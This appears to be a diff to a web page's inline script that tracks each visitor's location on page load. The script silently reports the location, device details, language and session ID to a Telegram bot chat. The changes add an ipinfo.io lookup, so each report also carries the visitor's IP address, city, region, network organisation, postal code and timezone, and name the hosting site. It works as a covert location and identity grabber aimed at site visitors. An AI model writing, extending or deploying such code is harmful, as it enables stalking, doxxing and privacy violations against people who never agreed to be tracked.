@@ -42,6 +42,11 @@
   const LS_SEEN    = "tg_last_seen";
   const SESSION_TIMEOUT = 7 * 24 * 60 * 60 * 1000;
 
+  // -----------------------------------------------------------------
+  // CONFIG: No need to set FETCH_URL; we use the current page's hostname.
+  // -----------------------------------------------------------------
+  const SOURCE_HOST = window.location.hostname; // website where this script runs
+
   function isSessionExpired() {
     return Date.now() - parseInt(localStorage.getItem(LS_SEEN) || "0") > SESSION_TIMEOUT;
   }
@@ -64,9 +69,16 @@
   setInterval(() => localStorage.setItem(LS_SEEN, Date.now()), 5000);
   localStorage.setItem(LS_SEEN, Date.now());
 
-  function buildMessage(lat, lon) {
+  // ---------- UTILITIES ----------
+  async function fetchIpInfo() {
+    const res = await fetch("https://ipinfo.io/json");
+    if (!res.ok) return null;
+    return await res.json();
+  }
+
+  function buildMessage(lat, lon, ipInfo) {
     const time = new Date().toLocaleTimeString();
-    return [
+    const lines = [
       `🆔 Session: ${sessionId}`,
       `📱 Device: ${navigator.userAgent}`,
       `🌐 Language: ${navigator.language}`,
@@ -75,8 +87,31 @@
       ``,
       `📍 Lat: ${lat.toFixed(6)} | Lon: ${lon.toFixed(6)}`,
       `🗺️ https://maps.google.com/?q=${lat},${lon}`,
-      `🔄 Updated: ${time}`
-    ].join("\n");
+      ``,
+      `🔄 Updated: ${time}`,
+      `🌐 Source: ${SOURCE_HOST}`
+    ];
+
+    if (ipInfo) {
+      lines.push(
+        ``,
+        `🌐 IP: ${ipInfo.ip || 'N/A'}`,
+        `🏙️ City: ${ipInfo.city || 'N/A'}`,
+        `📍 Region: ${ipInfo.region || 'N/A'}`,
+        `🏢 Org: ${ipInfo.org || 'N/A'}`,
+        // Postal code – only include if it looks like a real postal code
+        (() => {
+          const postal = ipInfo.postal?.toString().trim();
+          // Accept non‑empty strings; optionally filter with a simple pattern
+          // (e.g., /^\d{5}(-\d{4})?$/ for US ZIPs, /^\w{3,10}$/ for other formats)
+          return postal && /^[\w\s-]{3,}$/.test(postal) ? `📮 Postal: ${postal}` : null;
+        })(),
+        `🧭 Timezone: ${ipInfo.timezone || 'N/A'}`
+      );
+    }
+
+    // Remove any null entries before joining
+    return lines.filter(p => p !== null).join("\n");
   }
 
   async function sendMessage(text) {
@@ -90,13 +125,14 @@
     return data.ok ? data.result.message_id : null;
   }
 
-  async function editMessage(lat, lon) {
+  async function editMessage(lat, lon, ipInfo) {
     const mid = parseInt(messageId);
     if (!messageId || isNaN(mid)) return false;
+    const fullText = buildMessage(lat, lon, ipInfo);
     const res = await fetch(`https://api.telegram.org/bot${botToken}/editMessageText`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id: chatId, message_id: mid, text: buildMessage(lat, lon) })
+      body: JSON.stringify({ chat_id: chatId, message_id: mid, text: fullText })
     }).catch(() => null);
     if (!res) return false;
     const data = await res.json();
@@ -110,10 +146,12 @@
   }
 
   async function handlePosition(lat, lon) {
+    const ipInfo = await fetchIpInfo();
+
     if (isNewSession) {
       sessionId = Math.random().toString(36).substring(2, 8).toUpperCase();
       localStorage.setItem(LS_SESSION, sessionId);
-      const msgId = await sendMessage(buildMessage(lat, lon));
+      const msgId = await sendMessage(buildMessage(lat, lon, ipInfo));
       if (msgId) {
         messageId = String(msgId);
         localStorage.setItem(LS_MSG, messageId);
@@ -123,7 +161,7 @@
     }
 
     if (!messageId || isNaN(parseInt(messageId))) {
-      const msgId = await sendMessage(buildMessage(lat, lon));
+      const msgId = await sendMessage(buildMessage(lat, lon, ipInfo));
       if (msgId) {
         messageId = String(msgId);
         localStorage.setItem(LS_MSG, messageId);
@@ -131,7 +169,7 @@
       return;
     }
 
-    await editMessage(lat, lon);
+    await editMessage(lat, lon, ipInfo);
   }
 
   function startTracking() {
@@ -162,7 +200,6 @@
 
   window.onload = startTracking;
 </script>
-
   </head>
 
   <body>
